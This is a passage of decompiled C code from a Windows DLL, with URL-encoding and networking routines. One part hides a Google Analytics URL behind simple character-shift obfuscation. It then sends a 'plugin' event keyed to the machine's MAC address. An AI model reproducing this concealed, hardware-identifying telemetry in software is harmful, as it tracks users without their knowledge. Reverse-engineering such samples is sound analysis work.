    int32_t v23 = v11 - 1; // 0x10017c2d
    int32_t v24 = v22; // 0x10017c35
    int32_t v25 = v23; // 0x10017c35
    v18 = 1;
    v19 = 0;
    v20 = 0;
    v21 = v23;
    int32_t v26; // 0x10017ba0
    int32_t v27; // 0x10017ba0
    int32_t v28; // 0x10017c3b
    if (v22 == 0) {
        goto lab_0x10017c75;
    } else {
        while (true) {
          lab_0x10017c37:
            // 0x10017c37
            v27 = v25;
            v26 = v24;
            int32_t v29 = v27 - 1; // 0x10017c37
            v28 = v26 - 1;
            switch (*(char *)v29) {
                case 47: {
                    goto lab_0x10017c4c;
                }
                case 92: {
                    goto lab_0x10017c4c;
                }
                default: {
                    // 0x10017c46
                    v24 = v28;
                    v25 = v29;
                    v18 = a3;
                    v19 = 0;
                    v20 = v28;
                    v21 = v23;
                    if (v28 == 0) {
                        goto lab_0x10017c75;
                    }
                    goto lab_0x10017c37;
                }
            }
        }
      lab_0x10017c4c:
        if ((char)a6 >= 0) {
            goto lab_0x10017c67;
        } else {
            // 0x10017c53
            v18 = a3;
            v19 = 0;
            v20 = v28;
            v21 = v23;
            if (a7 == 0 || (a6 & 256) != 0 || v28 > a7 + 1) {
                goto lab_0x10017c67;
            } else {
                goto lab_0x10017c75;
            }
        }
    }
  lab_0x10017c67:
    // 0x10017c67
    v1 = v26;
    v18 = v26;
    v19 = 1;
    v20 = v28;
    v21 = v27;
    goto lab_0x10017c75;
}

// Address range: 0x10017ca0 - 0x10017f89
int32_t function_10017ca0(int32_t * a1, int32_t * a2, int32_t * a3, uint32_t a4, int32_t a5) {
    int32_t v1 = (int32_t)a1;
    int32_t v2 = (int32_t)a2;
    int32_t v3 = v1;
    int32_t v4; // bp-36, 0x10017ca0
    int32_t v5 = &v4; // 0x10017ca9
    int32_t v6 = v5; // 0x10017cae
    int32_t v7 = 0; // 0x10017cae
    int32_t v8; // 0x10017ca0
    int32_t v9; // 0x10017ca0
    int32_t v10; // 0x10017ca0
    int32_t v11; // 0x10017ca0
    if (a1 == NULL) {
        // 0x10017ca0
        v6 = v5 - 4;
      lab_0x10017cb0_2:
        // 0x10017cb0
        v7 = 0;
        *(int32_t *)v6 = -0x7fffbffb;
        function_100108b0((int32_t)&g173);
        v9 = v8;
        v11 = v10;
    }
    // 0x10017cba
    *(int32_t *)(v6 - 4) = v9;
    int32_t v12 = v6 - 8; // 0x10017cbb
    *(int32_t *)v12 = v11;
    int32_t v13 = v12; // 0x10017cc1
    if (v2 == v7) {
        // 0x10017cc3
        v13 = v6 - 12;
        *(int32_t *)v13 = -0x7fffbffb;
        function_100108b0((int32_t)&g173);
    }
    int32_t v14 = v13; // 0x10017ccf
    if (v1 == v2) {
        // 0x10017cd1
        v14 = v13 - 4;
        *(int32_t *)v14 = -0x7fffbffb;
        function_100108b0((int32_t)&g173);
    }
    unsigned char v15 = *(char *)v1; // 0x10017cde
    int32_t v16 = v7; // bp-16, 0x10017ce5
    int32_t v17 = 1; // 0x10017d00
    int32_t v18 = v2; // 0x10017d00
    int32_t v19 = v7; // 0x10017d00
    int32_t v20; // 0x10017ca0
    int32_t v21; // 0x10017ca0
    int32_t v22; // 0x10017ca0
    int32_t v23; // 0x10017ca0
    int32_t v24; // 0x10017ca0
    int32_t v25; // 0x10017ca0
    int32_t v26; // 0x10017ca0
    int32_t v27; // 0x10017ca0
    int32_t v28; // 0x10017ca0
    int32_t v29; // 0x10017ca0
    int32_t v30; // 0x10017ca0
    int32_t v31; // 0x10017ca0
    int32_t v32; // 0x10017ca0
    int32_t v33; // 0x10017ca0
    int32_t v34; // 0x10017ca0
    int32_t v35; // 0x10017ca0
    int32_t v36; // 0x10017ca0
    int32_t v37; // 0x10017ca0
    int32_t v38; // 0x10017ca0
    int32_t v39; // 0x10017ca0
    int32_t v40; // 0x10017ca0
    int32_t v41; // 0x10017ca0
    int32_t v42; // 0x10017ca0
    int32_t v43; // 0x10017ca0
    int32_t v44; // 0x10017ca0
    int32_t v45; // 0x10017ca0
    int32_t v46; // 0x10017ca0
    int32_t v47; // 0x10017ca0
    int32_t v48; // 0x10017ca0
    int32_t * v49; // 0x10017ca0
    int32_t * v50; // 0x10017ca0
    int32_t * v51; // 0x10017ca0
    int32_t v52; // 0x10017ca0
    int32_t * v53; // 0x10017ca0
    int32_t v54; // 0x10017ca0
    int32_t v55; // 0x10017ca0
    int32_t v56; // 0x10017ce3
    if (v15 == 0) {
        goto lab_0x10017f5e;
    } else {
        // 0x10017d06
        v56 = v2 + a4;
        v49 = (int32_t *)(v14 - 4);
        v50 = (int32_t *)(v14 - 8);
        v51 = (int32_t *)(v14 - 12);
        v52 = &v16;
        v53 = (int32_t *)(v14 - 16);
        v54 = &v3;
        v55 = &v2;
        v45 = 1;
        v42 = v7;
        v39 = v7;
        v36 = a5;
        v23 = v1;
        v29 = a5;
        v20 = v9 & -256 | (int32_t)v15;
        v32 = v2;
        v24 = v7;
        while (true) {
          lab_0x10017d06:
            // 0x10017d06
            v25 = v24;
            v33 = v32;
            int32_t v57 = v20;
            int32_t v58 = v29;
            int32_t v59 = v23;
            int32_t v60 = v36;
            int32_t v61 = v39;
            v43 = v42;
            v46 = v45;
            int32_t v62 = v59 + 1; // 0x10017d06
            v3 = v62;
            v35 = v25 != a4 ? v46 : 0;
            char v63 = v57; // 0x10017d16
            if (v63 != 58) {
                if (v63 != 37) {
                    bool v64 = (v58 & 32) == 0 | v63 != 63 == (v63 != 35);
                    int32_t v65 = v58 | 2;
                    v40 = v61;
                    v37 = v64 ? v60 : v65;
                    v30 = v64 ? v58 : v65;
                    v21 = v57;
                } else {
                    // 0x10017d94
                    v40 = v61;
                    v37 = v60;
                    v30 = v58;
                    v21 = v57;
                    if ((v58 & 4) != 0) {
                        unsigned char v66 = *(char *)v62; // 0x10017d9d
                        v47 = v35;
                        v18 = v33;
                        v27 = v25;
                        if (v66 == 0) {
                            // break -> 0x10017f58
                            break;
                        }
                        int32_t v67 = v66; // 0x10017d9d
                        int32_t v68; // 0x10017ca0
                        if (v66 < 58) {
                            // 0x10017daf
                            v68 = v67 + 0xffd0;
                        } else {
                            if (v66 < 71) {
                                // 0x10017dc0
                                v68 = v67 + 0xffc9;
                            } else {
                                // 0x10017dc9
                                v48 = 0;
                                v28 = v25;
                                if (v66 >= 103) {
                                    goto lab_0x10017f66_3;
                                }
                                // 0x10017dd5
                                v68 = v67 + 0xffa9;
                            }
                        }
                        int32_t v69 = v68;
                        v48 = 0;
                        v28 = v25;
                        if ((int16_t)v69 < 0) {
                            goto lab_0x10017f66_3;
                        }
                        unsigned char v70 = *(char *)(v59 + 2); // 0x10017de8
                        v47 = v35;
                        v18 = v33;
                        v27 = v25;
                        if (v70 == 0) {
                            // break -> 0x10017f58
                            break;
                        }
                        int32_t v71 = v59 + 3; // 0x10017df4
                        *v49 = (int32_t)v70;
                        v3 = v71;
                        int32_t v72 = function_10017b60(v71); // 0x10017dfb
                        v48 = 0;
                        v28 = v25;
                        if ((int16_t)v72 < 0) {
                            goto lab_0x10017f66_3;
                        }
                        // 0x10017e0f
                        v40 = v61;
                        v37 = v60;
                        v30 = v60;
                        v21 = v72 + 16 * v69 & 255 | v69 & 0xff00;
                    }
                }
                goto lab_0x10017e2e;
            } else {
                // 0x10017d1b
                v44 = v43;
                v41 = v61;
                v38 = v60;
                v31 = v58;
                v22 = v57;
                v34 = v33;
                v26 = v25;
                if ((char)v58 >= 0) {
                    goto lab_0x10017e9a;
                } else {
                    // 0x10017d23
                    v40 = v61;
                    v37 = v60;
                    v30 = v58;
                    v21 = v57;
                    if (v61 == 0) {
                        // 0x10017d2d
                        if (v35 != 0) {
                            uint32_t v73 = v33 - v25; // 0x10017d35
                            *(char *)v33 = 0;
                            v8 = v57;
                            v10 = v33;
                            int32_t v74; // 0x10017cbc
                            if (v73 < v74) {
                                goto lab_0x10017cb0_2;
                            }
                            // 0x10017d43
                            v8 = v57;
                            v10 = v33;
                            if (v56 < v73) {
                                goto lab_0x10017cb0_2;
                            }
                            // 0x10017d4e
                            int32_t v75; // 0x10017ca0
                            *v49 = v75 - v73;
                            *v50 = v73;
                            int32_t v76 = v3; // 0x10017d53
                            function_100179f0(v76, (int32_t)&g173);
                            if (v25 == 4) {
                                // 0x10017d60
                                *v49 = v25;
                                *v50 = v33 - 4;
                                *v51 = (int32_t)"file";
                                int32_t v77 = _strncmp((char *)&g173, (char *)&g173, (int32_t)&g173); // 0x10017d6a
                            }
                        }
                        // 0x10017d80
                        v40 = v25 + 1;
                        v37 = v60;
                        v30 = v58;
                        v21 = v57;
                    }
                    goto lab_0x10017e2e;
                }
            }
        }
      lab_0x10017f58:
        // 0x10017f58
        v19 = v27;
        v17 = v47;
        v48 = 0;
        v28 = v19;
        if (v17 == 0) {
            goto lab_0x10017f66_3;
        } else {
            goto lab_0x10017f5e;
        }
    }
  lab_0x10017f66_3:;
    uint32_t v78 = v28 + 1;
    if (a3 != NULL) {
        // 0x10017f6f
        *a3 = v78;
    }
    // 0x10017f74
    return v78 > a4 ? 0 : v48;
  lab_0x10017e2e:;
    int32_t v79 = v21;
    int32_t v80 = v30;
    int32_t v81 = v37;
    int32_t v82 = v40;
    int32_t v83 = v43;
    v44 = v83;
    v41 = v82;
    v38 = v81;
    v31 = v80;
    v22 = v79;
    v34 = v33;
    v26 = v25;
    int32_t v84; // 0x10017ca0
    int32_t v85; // 0x10017ca0
    int32_t v86; // 0x10017ca0
    int32_t v87; // 0x10017ca0
    int32_t v88; // 0x10017ca0
    int32_t v89; // 0x10017ca0
    int32_t v90; // 0x10017ca0
    int32_t v91; // 0x10017ca0
    if ((char)v80 >= 0) {
        goto lab_0x10017e9a;
    } else {
        // 0x10017e32
        v44 = v83;
        v41 = v82;
        v38 = v81;
        v31 = v80;
        v22 = v79;
        v34 = v33;
        v26 = v25;
        if ((v80 & 2) != 0) {
            goto lab_0x10017e9a;
        } else {
            char v92 = v79; // 0x10017e37
            if (v92 != 92) {
                // 0x10017e5f
                v44 = v83;
                v41 = v82;
                v38 = v81;
                v31 = v80;
                v22 = v79;
                v34 = v33;
                v26 = v25;
                if (v25 == 0 || v92 != 46) {
                    goto lab_0x10017e9a;
                } else {
                    // 0x10017e68
                    v44 = v83;
                    v41 = v82;
                    v38 = v81;
                    v31 = v80;
                    v22 = v79;
                    v34 = v33;
                    v26 = v25;
                    if ((v80 & 8) != 0) {
                        goto lab_0x10017e9a;
                    } else {
                        // 0x10017e6d
                        *v49 = v82;
                        *v50 = v80;
                        *v51 = v52;
                        *v53 = v54;
                        *(int32_t *)(v14 - 20) = v25;
                        *(int32_t *)(v14 - 24) = v33 - 1;
                        *(int32_t *)(v14 - 28) = v55;
                        int32_t v93 = function_10017ba0((int32_t)&g173, (int32_t)&g173, (int32_t)&g173, (int32_t)&g173, (int32_t)&g173, (int32_t)&g173, (int32_t)&g173); // 0x10017e81
                        v44 = v83;
                        v41 = v82;
                        v38 = v81;
                        v31 = v81;
                        v22 = v79;
                        v34 = v2;
                        v26 = v16;
                        v91 = v35;
                        v90 = v83;
                        v89 = v82;
                        v88 = v81;
                        v86 = v81;
                        v84 = v79;
                        v87 = v2;
                        v85 = v16;
                        if (v93 != 0) {
                            goto lab_0x10017f3f;
                        } else {
                            goto lab_0x10017e9a;
                        }
                    }
                }
            } else {
                // 0x10017e3c
                v44 = v83;
                v41 = v82;
                v38 = v81;
                v31 = v80;
                v22 = v79;
                v34 = v33;
                v26 = v25;
                if (v35 != 0 && (v80 & 256 || v82) != 0) {
                    // 0x10017e50
                    v44 = v83;
                    v41 = v82;
                    v38 = v81;
                    v31 = v80;
                    v22 = v79;
                    v34 = v33;
                    v26 = v25;
                    if (v25 >= 7 != v83 != 0) {
                        // 0x10017e5b
                        v44 = v83;
                        v41 = v82;
                        v38 = v81;
                        v31 = v80;
                        v22 = v79 & -256 | 47;
                        v34 = v33;
                        v26 = v25;
                    }
                }
                goto lab_0x10017e9a;
            }
        }
    }
  lab_0x10017e9a:;
    int32_t v94 = v26;
    int32_t v95 = v34;
    int32_t v96 = v22;
    int32_t v97 = v31;
    int32_t v98 = v38;
    g169 = v96;
    switch (v96) {
        case 0: {
            goto lab_0x10017eba;
        }
        case 1: {
            goto lab_0x10017eba;
        }
        case 2: {
            goto lab_0x10017eba;
        }
        case 3: {
            goto lab_0x10017eba;
        }
        case 4: {
            goto lab_0x10017eba;
        }
        case 7: {
            goto lab_0x10017eba;
        }
        case 9: {
            goto lab_0x10017eba;
        }
        case 10: {
            goto lab_0x10017eba;
        }
        case 11: {
            goto lab_0x10017eba;
        }
        case 12: {
            goto lab_0x10017eba;
        }
        case 13: {
            goto lab_0x10017eba;
        }
        case 18: {
            goto lab_0x10017eba;
        }
        case 19: {
            goto lab_0x10017eba;
        }
        case 34: {
            goto lab_0x10017eba;
        }
        case 35: {
            goto lab_0x10017eba;
        }
        case 36: {
            goto lab_0x10017eba;
        }
        case 37: {
            goto lab_0x10017eba;
        }
        case 38: {
            goto lab_0x10017eba;
        }
        case 39: {
            goto lab_0x10017eba;
        }
        case 66: {
            goto lab_0x10017eba;
        }
        case 67: {
            goto lab_0x10017eba;
        }
        case 68: {
            goto lab_0x10017eba;
        }
        default: {
            if ((char)v96 < 127) {
                goto lab_0x10017f2f;
            } else {
                goto lab_0x10017eba;
            }
        }
    }
  lab_0x10017eba:;
    int32_t v99; // 0x10017ca0
    int32_t v100; // 0x10017ca0
    int32_t v101; // 0x10017ca0
    int32_t v102; // 0x10017ca0
    if ((v97 & 2) != 0) {
        goto lab_0x10017f2f;
    } else {
        unsigned char v103 = (char)v96;
        if ((v97 & 16) != 0 == (v103 != 32)) {
            goto lab_0x10017f2f;
        } else {
            if ((v97 & 8) != 0 == v103 == 46) {
                goto lab_0x10017f2f;
            } else {
                if ((v97 & 64) == 0 == v103 == 37) {
                    goto lab_0x10017f2f;
                } else {
                    int32_t v104 = v16; // 0x10017ee3
                    if (v104 < a4 - 3) {
                        int32_t v105 = v104; // 0x10017efb
                        int32_t v106 = v97; // 0x10017efb
                        int32_t v107 = v95; // 0x10017efb
                        if (v35 != 0) {
                            // 0x10017efd
                            *(char *)v95 = 37;
                            int32_t v108 = v95 + 1; // 0x10017f00
                            int32_t v109 = v108; // 0x10017f06
                            if (v103 < 16) {
                                // 0x10017f08
                                *(char *)v108 = 48;
                                v109 = v95 + 2;
                            }
                            // 0x10017f0c
                            *v49 = 16;
                            *v50 = v56 - v109;
                            *v51 = v109;
                            *v53 = v96 & 255;
                            function_10017aa0((int32_t)&g173, (int32_t)&g173, (int32_t)&g173, (int32_t)&g173);
                            v107 = v95 + 3;
                            v2 = v107;
                            v105 = v16;
                            v106 = v98;
                        }
                        // 0x10017f27
                        v102 = v35;
                        v100 = v106;
                        v101 = v107;
                        v99 = v105 + 2;
                    } else {
                        // 0x10017ee8
                        v102 = 0;
                        v100 = v97;
                        v101 = v95;
                        v99 = v104 + 2;
                    }
                    goto lab_0x10017f3b;
                }
            }
        }
    }
  lab_0x10017f2f:
    // 0x10017f2f
    v102 = 0;
    v100 = v97;
    v101 = v95;
    v99 = v94;
    if (v35 != 0) {
        // 0x10017f35
        *(char *)v95 = (char)v96;
        int32_t v110 = v95 + 1; // 0x10017f37
        v2 = v110;
        v102 = v46;
        v100 = v97;
        v101 = v110;
        v99 = v94;
    }
    goto lab_0x10017f3b;
  lab_0x10017f3b:;
    int32_t v111 = v99 + 1; // 0x10017f3b
    v16 = v111;
    v91 = v102;
    v90 = v44;
    v89 = v41;
    v88 = v98;
    v86 = v100;
    v84 = v96;
    v87 = v101;
    v85 = v111;
    goto lab_0x10017f3f;
  lab_0x10017f3f:;
    unsigned char v112 = *(char *)v3; // 0x10017f42
    v47 = v91;
    v18 = v87;
    v27 = v85;
    if (v112 == 0) {
        // break -> 0x10017f58
        goto lab_0x10017f58;
    }
    // 0x10017f48
    v45 = v91;
    v42 = v90;
    v39 = v89;
    v36 = v88;
    v23 = v3;
    v29 = v86;
    v20 = v84 & -256 | (int32_t)v112;
    v32 = v87;
    v24 = v85;
    goto lab_0x10017d06;
  lab_0x10017f5e:
    // 0x10017f5e
    v48 = v17;
    v28 = v19;
    if (v19 < a4) {
        // 0x10017f63
        *(char *)v18 = 0;
        v48 = v17;
        v28 = v19;
    }
    goto lab_0x10017f66_3;
}

// Address range: 0x10017f94 - 0x100180e7
int32_t function_10017f94(int32_t a1) {
    // 0x10017f94
    int32_t v1; // 0x10017f94
    int32_t v2; // 0x10017f94
    *(char *)v2 = *(char *)&v2 + (char)v1;
    int32_t v3 = v1;
    *(char *)v3 = *(char *)&v1 + (char)v3;
    int32_t v4 = v1;
    *(char *)v4 = *(char *)&v1 + (char)v4;
    *(char *)v2 = *(char *)&v2 + (char)v1;
    int32_t v5 = v2;
    *(int32_t *)v5 = v1 + v5;
    int32_t v6 = v1;
    *(int32_t *)v6 = 2 * v6;
    *(char *)v2 = *(char *)&v2 + (char)v1;
    int32_t v7 = v2;
    *(int32_t *)v7 = v1 + v7;
    int32_t v8 = v2;
    *(int32_t *)v8 = v1 + v8;
    int32_t v9 = v2;
    *(int32_t *)v9 = v1 + v9;
    int32_t v10 = v2;
    *(int32_t *)v10 = v1 + v10;
    int32_t v11 = v2;
    *(int32_t *)v11 = v1 + v11;
    int32_t v12 = v2;
    *(int32_t *)v12 = v1 + v12;
    int32_t v13 = v1;
    *(int32_t *)v13 = 2 * v13;
    int32_t v14 = v1;
    *(char *)v14 = *(char *)&v1 + (char)v14;
    int32_t v15 = v1;
    *(char *)v15 = *(char *)&v1 + (char)v15;
    *(char *)v2 = *(char *)&v2 + (char)v1;
    int32_t v16 = v2;
    *(int32_t *)v16 = v1 + v16;
    int32_t v17 = v2;
    *(int32_t *)v17 = v1 + v17;
    int32_t v18 = v2;
    *(int32_t *)v18 = v1 + v18;
    int32_t v19 = v2;
    *(int32_t *)v19 = v1 + v19;
    int32_t v20 = v2;
    *(int32_t *)v20 = v1 + v20;
    int32_t v21 = v2;
    *(int32_t *)v21 = v1 + v21;
    int32_t v22 = v2;
    *(int32_t *)v22 = v1 + v22;
    int32_t v23 = v2;
    *(int32_t *)v23 = v1 + v23;
    int32_t v24 = v2;
    *(int32_t *)v24 = v1 + v24;
    int32_t v25 = v2;
    *(int32_t *)v25 = v1 + v25;
    int32_t v26 = v2;
    *(int32_t *)v26 = v1 + v26;
    int32_t v27 = v2;
    *(int32_t *)v27 = v1 + v27;
    int32_t v28 = v1;
    *(int32_t *)v28 = 2 * v28;
    int32_t v29 = v1;
    *(char *)v29 = *(char *)&v1 + (char)v29;
    *(char *)v2 = *(char *)&v2 + (char)v1;
    *(char *)v2 = *(char *)&v2 + (char)v1;
    int32_t v30 = v2;
    *(int32_t *)v30 = v1 + v30;
    int32_t v31 = v2;
    *(int32_t *)v31 = v1 + v31;
    int32_t v32 = v2;
    *(int32_t *)v32 = v1 + v32;
    int32_t v33 = v2;
    *(int32_t *)v33 = v1 + v33;
    int32_t v34 = v2;
    *(int32_t *)v34 = v1 + v34;
    int32_t v35 = v2;
    *(int32_t *)v35 = v1 + v35;
    int32_t v36 = v2;
    *(int32_t *)v36 = v1 + v36;
    int32_t v37 = v2;
    *(int32_t *)v37 = v1 + v37;
    int32_t v38 = v2;
    *(int32_t *)v38 = v1 + v38;
    int32_t v39 = v2;
    *(int32_t *)v39 = v1 + v39;
    int32_t v40 = v2;
    *(int32_t *)v40 = v1 + v40;
    int32_t v41 = v2;
    *(int32_t *)v41 = v1 + v41;
    int32_t v42 = v1;
    *(int32_t *)v42 = 2 * v42;
    int32_t v43 = v1;
    *(char *)v43 = *(char *)&v1 + (char)v43;
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    int32_t * v44 = InternetOpenA("Carefree/1.0", 1, NULL, NULL, 0); // 0x10018023
    int32_t v45 = (int32_t)v44; // 0x10018023
    int32_t v46 = v45; // bp-168, 0x10018037
    char * v47 = (char *)a1; // 0x10018038
    int32_t * v48 = InternetOpenUrlA(v44, v47, NULL, 0, -0x7f800000, 0); // 0x10018038
    int32_t v49 = (int32_t)v48; // 0x10018038
    int32_t v50 = &v46; // 0x10018042
    int32_t v51 = v49; // 0x10018042
    if (v48 == NULL) {
        // 0x10018044
        Sleep(0x927c0);
        int32_t v52 = v45; // bp-196, 0x10018058
        v50 = &v52;
        int32_t * v53 = InternetOpenUrlA(v44, v47, (char *)v48, v49, -0x7f800000, v49); // 0x10018059
        v51 = (int32_t)v53;
        if (v53 == NULL) {
            // 0x100180c6
            *(int32_t *)(v50 - 4) = a1;
            function_1001a6db();
            return _40___security_check_cookie_40_4();
        }
    }
    int32_t * v54 = (int32_t *)(v50 - 4); // 0x10018065
    *v54 = 99;
    int32_t * v55 = (int32_t *)(v50 - 8); // 0x1001806a
    *v55 = 0;
    int32_t * v56 = (int32_t *)(v50 - 12); // 0x1001806c
    char v57; // bp-107, 0x10017f94
    *v56 = (int32_t)&v57;
    int32_t * v58 = NULL; // bp-108, 0x1001806d
    _memset(NULL, (int32_t)&g173, (int32_t)&g173);
    *v54 = 0;
    int32_t v59; // bp-112, 0x10017f94
    *v55 = (int32_t)&v59;
    *v56 = (int32_t)&v58;
    *(int32_t *)(v50 - 16) = 19;
    *(int32_t *)(v50 - 20) = v51;
    v59 = 100;
    HttpQueryInfoA((int32_t *)100, (int32_t)&g173, &g173, &g173, &g173);
    *(int32_t *)(v50 - 24) = v51;
    InternetCloseHandle(&g173);
    int32_t v60 = v50 - 28; // 0x1001809c
    *(int32_t *)v60 = v45;
    int32_t v61 = InternetCloseHandle(&g173); // 0x1001809d
    v1 = v61;
    if ((char)(int32_t)v58 != 50) {
        // 0x100180b1
        return _40___security_check_cookie_40_4();
    }
    // 0x100180a5
    v1 = v61 & -256 | 48;
    char v62; // 0x10017f94
    if (v62 == 48 != (v57 == 48)) {
        // 0x100180b1
        return _40___security_check_cookie_40_4();
    }
    // 0x100180c6
    *(int32_t *)(v60 - 4) = a1;
    function_1001a6db();
    return _40___security_check_cookie_40_4();
}

// Address range: 0x100180f0 - 0x1001810b
int32_t function_100180f0(int32_t * a1, char * a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8) {
    // 0x100180f0
    int32_t v1; // bp+12, 0x100180f0
    return _vsprintf_s((char *)a1, 50, a2, (int32_t)&v1);
}

// Address range: 0x10018110 - 0x100181e0
int32_t function_10018110(void) {
    // 0x10018110
    __chkstk();
    if (*(char *)&g135 != 0) {
        // 0x100181cd
        return _40___security_check_cookie_40_4();
    }
    // 0x10018134
    GetAdaptersInfo((struct _IP_ADAPTER_INFO *)0x2880, &g173);
    int32_t v1; // bp-10376, 0x10018110
    int32_t v2 = &v1;
    int32_t v3 = v2 + 404;
    for (int32_t i = 0; i < 6; i++) {
        // 0x10018162
        if (*(char *)(i + v3) != 0) {
            // break (via goto) -> 0x1001818b
            goto lab_0x1001818b;
        }
    }
    int32_t v4 = *(int32_t *)v2; // 0x10018172
    while (v4 != 0) {
        // 0x10018160
        v2 = v4;
        v3 = v2 + 404;
        for (int32_t i = 0; i < 6; i++) {
            // 0x10018162
            if (*(char *)(i + v3) != 0) {
                // break (via goto) -> 0x1001818b
                goto lab_0x1001818b;
            }
        }
        // 0x10018172
        v4 = *(int32_t *)v2;
    }
    // 0x10018178
    return _40___security_check_cookie_40_4();
  lab_0x1001818b:;
    unsigned char v5 = *(char *)v3; // 0x1001818b
    unsigned char v6 = *(char *)(v2 + 405); // 0x10018192
    unsigned char v7 = *(char *)(v2 + 406); // 0x1001819a
    unsigned char v8 = *(char *)(v2 + 407); // 0x100181a2
    unsigned char v9 = *(char *)(v2 + 408); // 0x100181aa
    unsigned char v10 = *(char *)(v2 + 409); // 0x100181b2
    function_100180f0(&g135, "%02X%02X%02X%02X%02X%02X", (int32_t)v10, (int32_t)v9, (int32_t)v8, (int32_t)v7, (int32_t)v6, (int32_t)v5);
    // 0x100181cd
    return _40___security_check_cookie_40_4();
}

// Address range: 0x100181e0 - 0x100182bd
int32_t function_100181e0(int32_t * a1, int32_t * a2) {
    // 0x100181e0
    int32_t v1; // 0x100181e0
    int32_t v2; // 0x100181e0
    int32_t v3 = function_1001ac88(4000, v1, (int32_t *)v2); // 0x10018204
    int32_t v4; // bp-108, 0x100181e0
    __asm_rep_movsd_memcpy((char *)&v4, "iuuqt;00xxx/hpphmf.bobmzujdt/dpn0dpmmfdu", 10);
    int32_t v5 = &v4; // 0x1001821a
    int32_t v6 = v5; // 0x10018223
    while (*(char *)v6 != 0) {
        // 0x10018226
        v6++;
    }
    // 0x1001822d
    int32_t v7; // bp-107, 0x100181e0
    int32_t v8 = &v7; // 0x10018223
    if (v6 != v8) {
        int32_t v9; // 0x10018242
        for (int32_t i = 0; i < v9 - v8; i++) {
            // 0x10018231
            int32_t v10; // bp-4, 0x100181e0
            char * v11 = (char *)((int32_t)&v10 - 104 + i); // 0x10018231
            *v11 = *v11 - 1;
            int32_t v12 = v5;
            v9 = v12 + 1;
            while (*(char *)v12 != 0) {
                // 0x10018240
                v12 = v9;
                v9 = v12 + 1;
            }
        }
    }
    // 0x1001824d
    int32_t v13; // bp-136, 0x100181e0
    int32_t v14 = &v13; // 0x1001821d
    int32_t * v15 = (int32_t *)(v14 - 4); // 0x1001824d
    *v15 = (int32_t)&g32;
    int32_t * v16 = (int32_t *)(v14 - 8); // 0x10018252
    *v16 = (int32_t)"1.9.9";
    int32_t * v17 = (int32_t *)(v14 - 12); // 0x10018257
    *v17 = (int32_t)"Ss00";
    int32_t v18 = _rand(); // 0x1001825c
    int32_t * v19 = (int32_t *)(v14 - 16); // 0x10018264
    *v19 = v18;
    int32_t * v20 = (int32_t *)(v14 - 20); // 0x10018268
    *v20 = (int32_t)a2;
    int32_t * v21 = (int32_t *)(v14 - 24); // 0x10018269
    *v21 = (int32_t)a1;
    *(int32_t *)(v14 - 28) = (int32_t)"plugin";
    *(int32_t *)(v14 - 32) = function_10018110();
    *(int32_t *)(v14 - 36) = (int32_t)"UA-54655926-1";
    *(int32_t *)(v14 - 40) = v5;
    *(int32_t *)(v14 - 44) = (int32_t)"%s?v=1&tid=%s&cid=%s&t=event&ec=%s&ea=%s&el=%s&z=%d&de=UTF-8&cd1=%s&cd2=%s&cd3=%s";
    *(int32_t *)(v14 - 48) = 4000;
    *(int32_t *)(v14 - 52) = v3;
    _sprintf_s((char *)&g173, (int32_t)&g173, (char *)&g173);
    int32_t v22; // bp-124, 0x100181e0
    *v15 = (int32_t)&v22;
    *v16 = 0;
    *v17 = v3;
    *v19 = 0x10018000;
    *v20 = 0;
    *v21 = 0;
    CreateThread((struct _SECURITY_ATTRIBUTES *)&g173, (int32_t)&g173, (int32_t (*)(int32_t *))&g173, &g173, (int32_t)&g173, &g173);
    return _40___security_check_cookie_40_4();
}

// Address range: 0x100182c0 - 0x1001838a
int32_t function_100182c0(int32_t lpWideCharStr, int32_t lpWideCharStr2) {
    // 0x100182c0
    __chkstk();
    int32_t lpMultiByteStr; // bp-2008, 0x100182c0
    WideCharToMultiByte(0xfde9, 0, (int16_t *)lpWideCharStr, -1, (char *)&lpMultiByteStr, 1000, NULL, NULL);
    int32_t lpMultiByteStr2; // bp-1008, 0x100182c0
    WideCharToMultiByte(0xfde9, 0, (int16_t *)lpWideCharStr2, -1, (char *)&lpMultiByteStr2, 1000, NULL, NULL);
    int32_t v1; // bp-4008, 0x100182c0
    int32_t v2; // bp-6012, 0x100182c0
    function_10017ca0(&lpMultiByteStr, &v1, &v2, 2000, 0);
    int32_t v3; // bp-6008, 0x100182c0
    function_10017ca0(&lpMultiByteStr2, &v3, &v2, 2000, 0);
    function_100181e0(&v1, &v3);
    return _40___security_check_cookie_40_4();
}

// Address range: 0x10018390 - 0x1001865e
int32_t function_10018390(void) {
    int32_t v1 = &g37; // bp-2204, 0x100183bd
    int32_t v2; // bp-2164, 0x10018390
    int32_t v3 = CoCreateInstance((int32_t)&g37, NULL, 1, &g33, (int32_t **)&v2); // 0x100183c8
    int32_t * v4 = &v1; // 0x100183cc
    if (v3 < 0) {
        // 0x100183ce
        CoInitialize(NULL);
        int32_t v5 = &g37; // bp-2228, 0x100183e6
        int32_t v6 = CoCreateInstance((int32_t)&g37, NULL, 1, &g33, (int32_t **)&v2); // 0x100183eb
        v4 = &v5;
        if (v6 < 0) {
            // 0x1001864e
            return _40___security_check_cookie_40_4();
        }
    }
    int32_t v7 = (int32_t)v4;
    int32_t v8; // bp-2168, 0x10018390
    *(int32_t *)(v7 - 8) = (int32_t)&v8;
    *(int32_t *)(v7 - 12) = (int32_t)&g36;
    int32_t v9 = v7 - 16; // 0x1001840c
    *(int32_t *)v9 = v2;
    int32_t v10 = v9; // 0x10018413
    bool v11; // 0x10018390
    int32_t v12; // 0x10018390
    int32_t v13; // 0x10018390
    int32_t v14; // 0x10018586
    int32_t * v15; // 0x1001858b
    int32_t * v16; // 0x10018590
    int32_t * v17; // 0x10018597
    int32_t v18; // 0x100185ac
    int32_t * v19; // 0x100185ac
    int32_t v20; // 0x100185ac
    if (v2 < 0) {
        goto lab_0x1001863d;
    } else {
        // 0x10018419
        *(int32_t *)(v7 - 20) = 2;
        int32_t v21 = v7 - 28; // 0x10018427
        *(int32_t *)v21 = v8;
        v13 = v21;
        if (v8 < 0) {
            goto lab_0x1001862f_2;
        } else {
            // 0x10018434
            *(int32_t *)(v7 - 32) = 0;
            *(int32_t *)(v7 - 36) = 0;
            int32_t v22 = v7 - 40; // 0x10018443
            *(int32_t *)v22 = v2;
            v13 = v22;
            if (v2 < 0) {
